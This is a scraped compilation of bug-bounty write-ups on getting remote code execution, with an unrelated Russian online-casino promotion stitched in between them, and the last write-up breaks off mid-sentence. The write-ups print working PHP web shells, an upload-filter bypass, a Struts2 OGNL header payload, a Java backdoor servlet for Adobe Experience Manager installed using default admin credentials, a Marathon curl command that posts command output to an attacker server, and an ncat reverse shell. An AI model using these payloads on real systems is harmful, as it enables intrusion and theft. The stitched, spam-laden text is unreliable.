Press enter or click to view image in full size Curated list of Bug Bounty programs — https://bugbountydirectory.com I had found multiple bugs on the website before (like open redirect, hyperlink Injection, etc) but recently they updated the whole layout of the website and so i thought to look at it again. Browsing the website i found the file upload functionality to update the profile which wasn’t there before, so i uploaded a svg image and i got XSS. Press enter or click to view image in full size I reported it them and i kid you not they replied. Press enter or click to view image in full size I was like WTF, this must be some kind of joke as i have sent previous reports and they seem to reply just fine. This was a little too much. Also you can see he sent me gif in the word duped which was this. I was really angry at the way he replied, i mean the first line was enough to let me know, there was no need to brag about the money and you need to work harder. I didn’t really know how to respond to this, i thought maybe he’s had a tough day at his job and using this just for fun. I really wanted to get back at him but i let go and just waited for them to fix the issue. A few days pass and its fixed. So i looked to bypass the upload functionality and after a few tries i uploaded the file like xss.svg.jpeg and it worked i got an XSS again. I was happy and thought now is the right time to get back at that guy. So i started writing my report and while i was writing i thought maybe i should try to get RCE by uploading a PHP file. At first i simply uploaded a php file with code <?php phpinfo(); ?> and i got the PHP version page and all the details. Press enter or click to view image in full size This was enough to prove RCE and so i quickly reported and hoping it was not duped this time. Since it was a bypass i just sent it to the same guy to which he replied. Press enter or click to view image in full size I mean what the hell is wrong with this dude. So i contacted their support team and sent all the screenshots of the email showing the way he replied but they didn’t respond. So to prove the guy wrong i uploaded a php file with the code <?php echo \"Shell\";system($_GET['cmd']); ?> and i got a shell. Now i can just visit the image URL and add ?cmd=[command here] to run any command. Also it didn’t require any authentication that means once i uploaded the shell i can just visit the URL of the image and run any commands i want, no need to log in. Press enter or click to view image in full size Press enter or click to view image in full size Press enter or click to view image in full size So after i sent all the screenshots of the RCE i get this. Press enter or click to view image in full size I kinda knew this was gonna happen at some point and so i made a new report and sent it to the security team as it was a critical bug. After a month and a half of waiting they finally replied. Press enter or click to view image in full size I guess that makes for it then. This was one of the weirdest experience i have had in this field. After the incident they removed their bug bounty page from their website and is no longer present. Hope you learned something, if you liked then please share. Follow me on twitter — https://twitter.com/abhishekY495 Thank You.

Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nContent Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] | Nightwatch Cybersecurity Skip to content Nightwatch Cybersecurity Cybersecurity services and research Menu Home Blog Presentations Tools Contact Home Content Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] Content Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] January 4, 2018 April 29, 2019 nightwatchcyber Advisories duolingo , google , tinycards [NOTE ADDED 04/29/2019: The term “RCE” – “Remote Code Execution” in this context is taken from the Google Play Security Reward Program (GPSRP) as per their policy here , even though it is not normally used that way. It specifically refers to the ability to inject and run JavaScript within a WebView-based app. For now, the scope of this program is limited to RCE (remote-code-execution) vulnerabilities and corresponding POCs (Proof of concepts) that work on Android 4.4 devices and higher. This translates to any RCE vulnerability that allows an attacker to run code of their choosing on a user’s device without user knowledge or permission. Examples may include: Attacker gaining full control, meaning code can be downloaded from the network and executed (download and execute arbitrary code, native, Java code etc. Javascript) UI Manipulation to commit a transaction. For example, causing a banking app to make money transfers on behalf of the user without their consent. Opening of webview that may lead to phishing attacks. Opening webview without user input or interaction. ] Summary The TinyCards Android application provided by DuoLingo can be injected with malicious content by an MITM attacker. Because this application is a web-app framed in an Android WebView, this can lead to JavaScript being executed within the app by running JavaScript [which Google calls remote code execution (RCE)]. The root cause is lack of SSL being used on app startup when the initial web content is loaded into the WebView. The vendor has fixed this issue in v1.0 (version code 10) that was released via Google Play Store on November 20th, 2017 and users should install the latest version. MITRE has assigned # CVE-2017-16905 to track this issue. Vulnerability Details TinyCards is a flashcard application for preparing for tests and memorizing vocabulary. It is made by DuoLingo, which provides a platform for learning new languages. While monitoring network traffic of a test device running Android, we observed that during application startup an initial HTTP call is made to a non-HTTPS site, which then redirects to an HTTPS version. Further research into the application revealed that the application is essentially a thin browser wrapper using Android’s WebView around a web application loaded remotely. Because the initial call is done without HTTPS, it is possible for an MITM attacker to intercept this traffic and inject their own content. Since this is a web app, this can result in code execution within the application since all the content is web based. This would be accomplished by injecting and running arbitrary JavaScript. Screenshots of the captured traffic and relevant source code: Steps To Replicate (on Ubuntu 17.10) 1. Install the application on the Android device but do not start it. 2. Install dnsmasq and NGINX on the Linux host: sudo apt-get install dnsmasq nginx 3. Modify the /etc/hosts file to add the following entry to map the domain name to the Linux host: 192.168.1.x tinycards.duolingo.com 4. Configure /etc/dnsmasq.conf file to listen on the IP and restart DNSMASQ listen-address=192.168.1.x sudo /etc/init.d/dnsmasq restart 5. Add a file with malicious content (you may need to use sudo): cd /var/www/html echo powned >index.html 6. Modify the settings on the Android test phone to static, set DNS to point to “192.168.1.x”. AT THIS POINT – Android will resolve DNS against the Linux computer and serve the large servers file 7. Open the app on the Android device and observe injected content. All testing was done on v1.0 (version code 9) of the Android application using a Linux host running Ubuntu v17.10 and Android test device running Android v7. Vendor Response and Mitigation To fix this issue, the vendor has changed the initial URL for web content being loaded within the app to use SSL. The vendor has fixed this issue in v1.0 (version code 10) that was released via Google Play Store on November 20th, 2017 and users should install the latest version. Bounty Information DuoLingo doesn’t currently offer bounties, however, this bug has fulfilled the requirements of Google Play Security Reward Program and a bounty has been paid from that program. References CVE-ID: CVE-2017-16905 HackerOne Reports: 281605 (DuoLingo) and 293444 (Google Play Rewards) Credits We would like to thank the vendor for the quick turnaround and fix for this vulnerability.

So first I tried Into The edit Profile screen I was trying to find An XSS Because XSS pays a lot , But sadly I can not Find any XSS in every Possible parameter So I Think That Lets upload A shell For that I was checking that The Image is Uploading on the same app or any third party app all other images on that website was on https://victimsite.com/images/static/image.jpg so when i uploaded the simple image on the profile it was on https://victimsite.com/images/users/<ProfilID>/smilehacker.jpg Now the next thing was to try uploading any other extension, but if i try uploading any extension other than JPG, PNG it popup a forbidden error. So its final that there are Restriction of other MIME types. so I think that i need to try GET request containing the filename & mime, in it https://victimsite.com/settings/<id>/avatar?name=test.png&mime=image%2Fpng and the response code of the request was 200 OK simple & The next request was PUT request for file upload to the images directory. https://victimsite.com/users/<id>/testtts.png I tried chaining the content of the PUT request as HTML or TXT but it respond with error code 500 [That sucks…] But later I realized that It was because i forget that the referer header contains the last URL . But then tested it again By changing the name & mime in First GET request as it was added as Referer to the next PUT request and then i changed the content & file type in the PUT request. AND I GOT 200 https://victimsite.com/settings/<id>/avatar?name=smile.html&mime=text%2Fhtml and Following that request i made changes to the PUT request to Upload an HTML file and it was Success. Now I have a Stored XSS using HTML file, I bypassed the Same origin Policies & X-Frame-Options Header and more…… Now i decided to upload a PHP file With My Remote Code.. <?php if(isset($_REQUEST[‘cmd‘])){ echo “<pre>“; $cmd = ($_REQUEST[‘cmd‘]); system($cmd); echo “</pre>“; die; }?> Its simple PHP Backdoor which i found from google TBH.. But when I uploaded PHP code It gave Me 403 status code (Feels Like WTF is Happening). So I think that Lets try Some Other extentions (Was Think That’s The Last try after it I’ll Leave that). And when i Tried php5 , php7 It works As an Magic Target: https://victimsite.com/images/users/<id>/try.phps?cmd=cat+/etc/passwd (MY FIRST RCE) They Fixed this Bug after a week But due to company Policy I can not Show u the Name .

Here’s the full content:\n\nHow to get RCE on AEM instance without Java knowledge | by byq | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How to get RCE on AEM instance without Java knowledge byq 9 min read · Oct 1, 2019 -- Listen Share Before deep diving into how I was able to perform remote code execution on one of Adobe Experience Manager instances at bug bounty program let me tell you in brief about this huge and complex system. Few years ago Peter Adkins (Darkarnium) found RCE at signout.live.com, so with his permission I give a technical description of the system taken from his write-up . If you are familiar with AEM, you can safely go to Discover section. AEM Overview Press enter or click to view image in full size Adobe Experience Manager (AEM) is an “enterprise grade” content management system sold and maintained by Adobe Systems. The core components of this system run inside of a JVM, with an optional Apache HTTP server module provided for “caching and/or load-balancing”. AEM Architecture Under the hood, “stock” AEM deployment consists of a vast array of open source products and some Adobe brand glue. Rather than the services which comprise AEM being deployed in a “traditional” manner, they are instead implemented as components inside of an Apache Felix based Open Services Gateway initiative ( OSGi ) framework. Press enter or click to view image in full size A view of the AEM internal architecture, taken from the AEM 5.6.1 documentation. The advantage of this system is that these components, known as OSGi “bundles”, can be installed, restarted, or re-configured without the need to restart the OSGi framework or underlying JVM. In addition, this architecture allows for the extension of AEM through the development and installation of custom OSGi bundles. Deployment Topology A “typical” AEM deployment consists of three distinct tiers: Author (runs in a JVM) Publish (runs in a JVM) Dispatch (runs as an Apache HTTP Server module) An example diagram of this style of tiered deployment can be found below: Press enter or click to view image in full size A common three tier deployment, taken from the AEM 5.6.1 documentation. In order to improve the security posture of an AEM installation, these tiers are typically deployed with the Author and Publish tiers protected from the world through network segmentation and/or access controls. The Dispatch tier is generally the only tier “open” to the internet, providing a mechanism to retrieve and cache content from the Publish tier (in a manner not unlike that of a reverse-proxy). Dispatch Filtering As a result of the Dispatch tier pulling data from upstream Publish nodes, the Dispatch module implements a “filtering” mechanism in order to mitigate abuse. This filter is especially important given that nodes in the Publish tier serve both content and administrative resources via the same Apache Sling service. As an example of why this filtering is required, the following URL on the Publish node publish.example.org are able to be accessed without any authentication: https://publish.example.org/etc/reports/diskusage.html This page provides a browsable view of all data in the content repository. However, if accessed via the Dispatch tier — assuming a default Dispatch configuration with an empty cache — the following should be true: https://dispatch.example.org/etc/reports/disusage.html Filtered by the Dispatch tier, with an HTTP 404 served to the requestor. In order to implement these restrictions, the default AEM Dispatch module configuration contains a set of filters which operate in a default “deny” manner: If a resource hasn’t been explicitly allowed inside of a filter block, requests for that resource would be denied. In order to better demonstrate this configuration, an excerpt from an example Dispatch configuration file — taken from the AEM 5.6.1 “security checklist” — has been included below: # only handle the requests in the following acl. default is 'none' # the glob pattern is matched against the first request line /filter { # deny everything and allow specific entries /0001 { /type \"deny\" /glob \"*\" } /0023 { /type \"allow\" /glob \"* /content*\" } ... # enable specific mime types in non-public content directories /0041 { /type \"allow\" /glob \"* *.css *\" } # enable css /0042 { /type \"allow\" /glob \"* *.gif *\" } # enable gifs ... } The end result of this configuration is that the ability to pull Publish tier administrative resources through the Dispatch tier should be prevented. Discover I hope this information is enough to understand key features of AEM. After watching a great presentation “ AEM hacker — approaching Adobe Experience Manager webapps in bug bounty programs ” by Mikhail Egorov ( 0ang3el ) at Bugcrowd Level Up 0x03 event where he presented tools for AEM security testing and exploitation I decided to make some practice. I chose one of the bug bounty program, which contains several AEM instance in scope and began testing. Due to the non-disclosure policy of the program I will only use example.org domain. First of all I launched aem_hacker.py — a script which performs dozens of checks to find security misconfigurations. After a few minutes I got a long listing of potential issues which meant that this instance had some problems with security. One of the most interesting findings for me was exposed Felix Console, which in some cases can lead to RCE. Press enter or click to view image in full size The Web console in AEM is based on the Apache Felix Web Management Console. Apache Felix is a community effort to implement the OSGi R4 Service Platform, which includes the OSGi framework and standard services. The Web console offers a selection of tabs for maintaining the OSGi bundles, including: Configuration: used for configuring the OSGi bundles, and is therefore the underlying mechanism for configuring AEM system parameters Bundles: used for installing bundles Components: used for controlling the status of components required for AEM If you try to send following request: GET /system/console/bundles HTTP/1.1 Host: example.org … in most cases you will get the following response: HTTP/1.1 404 Not Found To bypass dispatcher I used request: GET /system/console/bundles ?.css HTTP/1.1 Host: example.org … and get the following response: HTTP/1.1 403 Forbidden Actually, such behavior proved that instance was vulnerable to CVE-2016–0957 . So, the next step I needed to pass through was some kind of authorization. Generally AEM accept HTTP Basic Authorization header. But, what about credentials? Let’s try default pair admin/admin . And … we are in. Press enter or click to view image in full size Exposed Web Console at signout.live.com from Darkarnium write-up Since this was my first time seeing Web Console I spent some time just exploring it. As you can see on the screenshot above it contains a lot of juicy info and functionality. But let’s return to OSGi bundle and achieve desired RCE. Exploit Luckily, 0ang3el have prepared aem-rce-bundle — which contains pre-build bundle, source code of this bundle and some instructions. At https://example.org/system/console/status-productinfo I checked installed AEM version and got Adobe Experience Manager (6.1.0.x) (available since May 28, 2015). So, this meant that I couldn’t use pre-build bundle, because it requires at least version 6.2. If you don’t have ready exploit, try to build it yourself. As said in repository’s instruction for AEM version 6.0 or newer I can use following Maven command: mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \\ -DarchetypeGroupId=com.adobe.granite.archetypes \\ -DarchetypeArtifactId=aem-project-archetype \\ -DarchetypeVersion=SELECT_FROM_TABLE \\ -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/ From the table I chose Archetype version 10. At that moment I didn’t even have Maven installed on my machine, so it required some time to install and configure it. After Maven was ready I ran final command: mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \\ -DarchetypeGroupId=com.adobe.granite.archetypes \\ -DarchetypeArtifactId=aem-project-archetype \\ -DarchetypeVersion=10 \\ -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/ And this was the moment when the real difficulties arose. As you probably have already understood, it was my first experience working with Maven and when it started to ask for additional info, such as groupId, artifactId, package, artifactName etc, I got stuck. However after some time spending to research of structure and source codes of pre-build bundle I found correct variant: Define value for property 'groupId': : aem.hacks Define value for property 'artifactId': : rce.bundle Define value for property 'version': 1.0-SNAPSHOT: : Define value for property 'package': aem.hacks: : Define value for property 'appsFolderName': : aem.hacks Define value for property 'artifactName': : aem.hacks Define value for property 'componentGroupName': : aem Define value for property 'contentFolderName': : aem.hacks Define value for property 'cssId': : aem Define value for property 'packageGroup': : aem.hacks Define value for property 'siteName': : aem.hacks After creation of the project I deleted all unnecessary directories and project structure looked like this: └── rce.bundle ├── README.md ├── core │ ├── pom.xml │ └── src │ └── main │ └── java │ └── aem │ └── hacks │ └── core │ ├── package-info.java │ └── servlets │ └── SimpleServlet.java └── pom.xml In rce.bundle/pom.xml I left only core module: <modules> <module>core</module> </modules> After that I modified servlet from aem-rce-bundle (with my practically zero Java knowledge), because it didn’t work for me. Final variant of SimpleServlet.java (it’s probably awful, but c’mon): package aem.hacks.core.servlets; import org.apache.felix.scr.annotations.sling.SlingServlet; import org.apache.sling.api.SlingHttpServletRequest; import org.apache.sling.api.SlingHttpServletResponse; import org.apache.sling.api.resource.Resource; import org.apache.sling.api.servlets.SlingAllMethodsServlet; import org.apache.sling.api.servlets.SlingSafeMethodsServlet; import javax.servlet.ServletException; import java.io.IOException; import java.io.*; @SuppressWarnings (\"serial\") @SlingServlet (resourceTypes = \"aem.hacks/structure/page\", paths = \" /bin/backdoor \") public class SimpleServlet extends SlingSafeMethodsServlet { @Override protected void doGet(final SlingHttpServletRequest req, final SlingHttpServletResponse resp) throws ServletException, IOException { final Resource resource = req.getResource(); Process proc = Runtime.getRuntime().exec(req.getParameter(\"cmd\")); BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuilder sb = new StringBuilder(); String s = null; while ((s = stdInput.readLine()) != null) { sb.append(s + \"\\n\"); } String output = sb.toString(); resp.setContentType(\"text/plain\"); resp.getWriter().write(output); } } After everything was ready I launched command to build and package bundle: mvn package .. and got red: ... [INFO] BUILD FAILURE ... Here I tried to make some changes to Maven command, project structure, servlet source code, but every time I got BUILD FAILURE. And maybe it could be the standstill, but one of my colleagues (PHP expert) advised me to check my version of Java. It turned out that I built bundle using Java 11 and after switching to Java 8 I finally got BUILD SUCCESS. Here is a command which helped me: update-alternatives --config java My bundle was ready and located in rce.bundle/core/target. I navigated to https://example.org/system/console/bundles , pressed “Install/Update…” button and uploaded created jar file with enabled “Start Bundle” checkbox. At console I already saw that installation was successful and backdoor was accessible at defined in servlet path. https://example.org/bin/backdoor?cmd=id uid=1004(publish) gid=1004(publish) groups=1004(publish) After identification of RCE I deleted uploaded bundle from AEM and reported issue to vendor. In a few hours I got first reply from triage team, which marked my submission as “Not applicable” because it was out of scope. Sad, but it’s a common case in bug bounty. Anyway I got great experience of exploitation of such things and spent my time not in vain. And probably it should be the end of the story, but exactly one month later I got notification from Bugcrowd with following content: okay. Vendor accepted this due to the severity even as it was out-of-scope. Rightly. P.S. Thanks to Peter Adkins (Darkarnium) , Mikhail Egorov ( 0ang3el ) and my PHP expert colleague.

As you already know few months back a critical venerability have been discovered in apache Struts2 (CVE-2017–5638) leads to a remote code execution, the easy exploit for the same have been published and a lot of web applications were getting exploited in massive way. After almost 3 weeks of the Struts2 exploit being published and during my Recon process i came across this link: https://svdevems01.direct.gq1.yahoo.com/sm/login.jsp which is a login page for the selligent Messages studio solution used by yahoo. Press enter or click to view image in full size Tried to find vulnerabilities there and i failed until i found this endpoint : https://svdevems01.direct.gq1.yahoo.com/sm/login/loginpagecontentgrabber.do , for those who don't know if you find endpoints with .action, .do , .go that means the web application running struts2. So as i said the exploit was published and easy to use but also it didn't work for this target even though it was confirmed that its vulnerable, that means there was WAF or something blocking my attacks. I couldn't stop here as its vulnerable and for reporting it i have to provide a valid POC for the same, After some searches i found a twitter post with a payload that can bypass WAF to exploit this vulnerability. The detection method i found makes use of the Content-Type HTTP header to send a specially crafted packet. The header is shown below: Content-Type: %{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Ack-Th3g3nt3lman-POC’,4*4)}.multipart/form-data The new request asks the web server to multiple two numbers and can be used to request the web server to perform any other operation. In the example above the two numbers are 4 and 4 . and the answer from the web server, was 16 which concluded that the server is vulnerable. The response as per the below picture will contain the new header X-Ack-Th3g3nt3lman-POC: 16 Press enter or click to view image in full size That was fair enough to report the bug for yahoo through hackerone, Yahoo Triaged the report within 30 minutes, took the application offline to fix the issue and i confirmed the fix after that, within a week i was awarded with 5500$ for this finding. Hope You liked this finding and i apologize for my weak English if there is any mistakes in this post.

Written by omespino August 27, 2019 January 7, 2022 WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about why your professional background mather when you do bug bounties (in my case my job as DevOps engineer) if you know how something works, you might be able to break it. This blogpost appeared first in the book Bug Bounty Write Ups Collection Report Summary: Hi team I i’ve found that some of your Marathon intances are vulnerablte to RCE as root Description and impact: Marathon is a production-grade container orchestration platform for Mesosphere’s Datacenter Operating System (DC/OS) and Apache Mesos . So, since Marathon is a orchestration platform for mesos, that means that you can schedule tasks to be performed whatever you want, per example a simple bash command (pretty similar to cronjobs) Steps To Reproduce: One day I just was navigating in shodan and I don’t know why I thought about the Marathon service (As DevOps engineer, in one of my activities I needed to set up some Marathon/Mesos/Spark instances), that made me think about which companies have Marathon instances activated without any authentication in production environments, so I decided to try with some dorks in shodan (like “SSL: Redacted” “X-Marathon-Leader”) when suddenly some wild server appear: I thought WOW! Marathon instances with HTTP/1.1 200 OK responses, it is not a guarantee, but 90% of the times, a 200 response on Marathon UI means that you have access without any kind of authentication needed Extracted from the report: Hi Sec team here is the POC 1.- Go to https://XXX.XXX.XXX.XXX/ ui/#/apps and see the Marathon’s Dashboard and the application list (without any authentication needed): 2.- then set your own server listening with netcat with the following command: #set your own server to wait the response root@h0st:~# nc -lvvv 55555 3.- then create a Marathon application that will be execute the RCE command with the following curl command: # create a marathon application that will be execute any command that you want (in this case is /usr/bin/wget --user-agent=marathon-id --post-data=`id`) # replace attacker_server with your listening server that you set up with netcat and the \"rce-id\" tag with your own custom tag, this is the Marathon application name root@h0st:~# curl -sk -X POST -H \"Content-type: application/json\" https://XXX.XXX.XXX.XXX/v2/apps -d '{ \"mem\": 16, \"id\": \"rce-id\", \"cmd\": \"/usr/bin/wget --user-agent=marathon-id --post-data=`id` attacker_server:55555\"}' 4.- Then go to https://XXX.XXX.XXX.XXX/ui/#/apps again and see the application created named “rce-id” that we just created with curl, and wait some seconds and recieve the command from the Marathon Instance and the command output PS. after that I deleted immediately the rce-id aplication from Marathon UI Tools: netcat, curl and any browser Is this bug public or known by third parties? No Can I reproduce this issue every time? Yes How did I find this bug? via shodan. well that’s it, if you have any doubt, comment or sugestion just drop me a line here or in twitter @omespino , read you later.

Andy Gill 22 Jul 2017 • 7 min read Intro Continuing the non- ltr101 posts for a second here is a quick write-up of a cool bug I found recently on a bounty program. It features Remote Code Execution via an abandoned web service. Enabling me to traverse the target internal network and gain access to some juicy data. Now it's not often that I manage to find bugs let alone cool ones to write about so hopefully this post is enjoyable to read. If you can't be bothered reading the tl;dr is I got RCE via a PUT method and turned this into trawling an internal network similar to a red teaming exercise. NOTE : Finding PUT method available unauthenticated is very uncommon these days however it is still worth looking for. Your Subdomain is called what?! It all started with the usual recon, look at sub-domains, resolve to IPs then look at ports. However this time around I found a weird hostname with an application running on port 64351 , not your average web port granted most would find it with a full port scan anyway. The domain was similar to (haven't listed the company for confidentiality reasons): fast.force.staging.intcorp.yoda.domain.com Starting out it popped out to me for a few reasons: It was the only domain with anything other than admin, vpn, email etc in it Mention of intcorp peeked my interest It's not your average sub-domain length fast force staging int corp yoda is a bit random too! So off I went, resolved the domain. Bingo we have an IP, however browsing to just he domain returned nothing, enter le port scan via nmap: nmap -sTV -p- -Pn --max-retries 3 fast.force.staging.intcorp.yoda.domain.com --version-all -oA UsethePowa A little while later the port scan result came back: Starting Nmap 7.50 ( https://nmap.org ) at 2017-06-29 22:47 BST Nmap scan report for fast.force.staging.intcorp.yoda.domain.com (x.x.x.x) Host is up (0.082s latency). Not shown: 979 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 25/tcp closed smtp? 80/tcp closed http 81/tcp closed hosts2-ns 90/tcp open http? 64351/tcp open http 2 services unrecognised despite returning data. Initial identification was made based upon some weird looking files I found in the application's web root on port 64351 each containing phpinfo files however with varying names. Now the usual way to get files there would be via some form of file upload etc. However in this case I couldn't find anything that looked remotely like a file upload, instead going back to real old school attack enter HTTP Methods. HTTP Verbs/Methods A quick tl;dr on HTTP Verbs/Methods, they are essentially the way in which a request is issued to a server or application. The two most commonly used are GET & POST for downloading and uploading data to an application. In this case I send an OPTIONS request to the server on port 64351 to find out what methods were allowed. The response indicated that the application accepted GET , POST , HEAD & PUT . The first three are pretty common however the PUT request is uncommon and the exploit path to upload is even more uncommon. PUT I managed to use PUT to write files to a folder in the webroot called test , upon doing this I was able to write any files I wanted, I assumed this was the way those phpinfo files got there in the first place. A quick look around with the web shell found me the phpinfo files again: So by utilising the PUT method I uploaded a simple PHP web shell, the code of which can be found below: <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>$cmd<pre>\"; die; } ?> It takes commands from the ?cmd parameter and executes system commands from there. The PUT request was successful and Bingo a shell was achieved, all be it a web shell: May the Shell be with you! However I wanted more freedom within this environment to explore. Enter some OSCP nostalgia, turning a web shell into a reverse shell with netcat. On a lot of hosts you'll be lucky if you have access to netcat let alone ncat ! This server appeared to have access to both which was a lucky day for me! Using the line below I was able to connect to a listener I'd setup and start to explore more. I spent ages trying to get a port to connect out on but finally settled for 443 as the server was allowing access out over that port. Command from webshell: ncat -e /bin/bash ATTACKERHOST 443 Listener Server Side: ncat -l -v -p 443 Issuing the command from the webshell threw me a nice connect back from the app, at this point I was shaking with excitement! RCE, a web shell now a reverse shell, it's like it was meant to be! However thinking back to OSCP it's always nice to have a full bash shell, so with one python one-liner I had an interactive bash shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Digging Deeper So at this stage, I decided to have a poke around the OS and see what I could find with my newly acquired interactive shell. Quickly I found some very juicy looking directories within a folder in /tmp/CorpNet . This folder contained three other folders: CorpVPNKeys CorpZT CitrixCorp Digging within these folders yielded some very useful files including one file containing an internal Zone Transfer of the 